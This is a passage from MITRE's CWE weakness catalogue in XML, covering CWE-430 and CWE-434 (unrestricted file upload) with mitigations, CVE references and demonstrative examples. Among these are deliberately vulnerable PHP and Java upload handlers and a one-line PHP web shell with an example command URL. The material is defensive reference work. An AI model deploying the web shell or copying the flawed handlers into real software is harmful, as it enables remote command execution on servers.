					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="430" Name="Deployment of Wrong Handler" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The wrong "handler" is assigned to process an object.</Description>
         <Extended_Description>An example of deploying the wrong handler would be calling a servlet to reveal source code of a .JSP file, or automatically "determining" type of the object even if it is contradictory to an explicitly specified type.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="691" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="433" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="434" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>This weakness is usually resultant from other weaknesses.</Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Perform a type check before interpreting an object.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Reject any inconsistent types, such as a file with a .GIF extension that appears to consist of PHP code.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-0004</Reference>
               <Description>Source code disclosure via manipulated file extension that causes parsing by wrong DLL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0004</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0025</Reference>
               <Description>Web browser does not properly handle the Content-Type header field, causing a different application to process the document.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0025</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-1052</Reference>
               <Description>Source code disclosure by directly invoking a servlet.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1052</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1742</Reference>
               <Description>Arbitrary Perl functions can be loaded by calling a non-existent function that activates a handler.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1742</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Improper Handler Deployment</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="11"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;File Handlers&#34;, Page 74"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Improper Handler Deployment</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="434" Name="Unrestricted Upload of File with Dangerous Type" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="351" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="436" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="430" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
               <Description>This can be primary when there is no check at all.</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>This is frequently resultant when use of double extensions (e.g. ".php.gif") bypasses a sanity check.</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>This can be resultant from client-side enforcement (CWE-602); some products will include web script in web clients to check the filename, without verifying on the server side.</Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Name="ASP.NET" Prevalence="Sometimes"/>
            <Language Name="PHP" Prevalence="Often"/>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Unrestricted File Upload</Term>
               <Description>Used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for .asp and .php extensions uploaded to web servers because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Generate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all.[REF-422] [REF-423]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically. [REF-423]</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Define a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before allowing .html or .htm file types.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Ensure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that "filename.php.gif" is fed to the PHP interpreter.[REF-422] [REF-423]</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When running on a web server that supports case-insensitive filenames, perform case-insensitive evaluations of the extensions that are provided.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not rely exclusively on sanity checks of file contents to ensure that the file is of the expected type and size. It may be possible for an attacker to hide code in some file segments that will still be executed by the server. For example, GIF images may contain a free-form comments field.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not rely exclusively on the MIME content type or filename attribute when determining how to render a file. Validating the MIME content type and ensuring that it matches the extension is only a partial solution.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type "file".</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="upload_picture.php" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Once submitted, the form above sends the file to upload_picture.php on the web server. PHP stores the file in a temporary location until it is retrieved (or discarded) by the server side code. In this example, the file is moved to a more permanent pictures/ directory.</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>// Define the target location where the picture being</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// uploaded is going to be saved.</xhtml:i>
                     <xhtml:br/>$target = "pictures/" . basename($_FILES['uploadedfile']['name']);<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// Move the uploaded file to the new location.</xhtml:i>
                     <xhtml:br/>if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))<xhtml:br/>{<xhtml:div style="margin-left:1em;">echo "The picture has been successfully uploaded.";</xhtml:div>}<xhtml:br/>else<xhtml:br/>{<xhtml:div style="margin-left:1em;">echo "There was an error uploading the picture, please try again.";</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The problem with the above code is that there is no check regarding type of file being uploaded. Assuming that pictures/ is available in the web document root, an attacker could upload a file with the name:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>malicious.php</xhtml:div>
               </Example_Code>
               <Body_Text>Since this filename ends in ".php" it can be executed by the web server. In the contents of this uploaded file, the attacker could use:</Body_Text>
               <Example_Code Nature="Attack" Language="PHP">
                  <xhtml:div>&lt;?php<xhtml:div style="margin-left:1em;">system($_GET['cmd']);</xhtml:div>
                     <xhtml:br/>?&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Once this file has been installed, the attacker can enter arbitrary commands to execute using a URL such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</xhtml:div>
               </Example_Code>
               <Body_Text>which runs the "ls -l" command - or any other type of command that the attacker wants to specify.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:br/>// the starting position of the boundary header<xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:br/>// verify that content type is multipart form data<xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:br/>// output the file to the local upload directory<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:1em;">if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:1em;">bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>}</xhtml:div>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:br/>// output successful upload response HTML page</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>// output unsuccessful upload response HTML page<xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>}<xhtml:div style="margin-left:1em;">...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.</Body_Text>
               <Body_Text>Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-0901</Reference>
               <Description>Web-based mail product stores ".shtml" attachments that could contain SSI</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0901</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1841</Reference>
               <Description>PHP upload does not restrict file types</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1841</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1868</Reference>
               <Description>upload and execution of .php file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1868</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1881</Reference>
               <Description>upload file with dangerous extension</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1881</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0254</Reference>
               <Description>program does not restrict file types</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0254</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2262</Reference>
               <Description>improper type checking of uploaded files</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2262</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4558</Reference>
               <Description>Double "php" extension leaves an active php extension in the generated filename.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4558</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6994</Reference>
               <Description>ASP program allows upload of .asp files by bypassing client-side checks</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6994</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3288</Reference>
               <Description>ASP file upload</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3288</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-2428</Reference>
               <Description>ASP file upload</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-2428</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Unrestricted File Upload</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Malicious File Execution</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-434</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-422"/>
            <Reference External_Reference_ID="REF-423"/>
            <Reference External_Reference_ID="REF-424"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;File Uploading&#34;, Page 1068"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-434"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>This can have a chaining relationship with incomplete denylist / permissive allowlist errors when the product tries, but fails, to properly limit which types of files are allowed (CWE-183, CWE-184).</xhtml:p>
               <xhtml:p>This can also overlap multiple interpretation errors for intermediaries, e.g. anti-virus products that do not remove or quarantine attachments with certain file extensions that can be processed by client systems.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Functional_Areas, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>converted from Compound_Element to Weakness</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
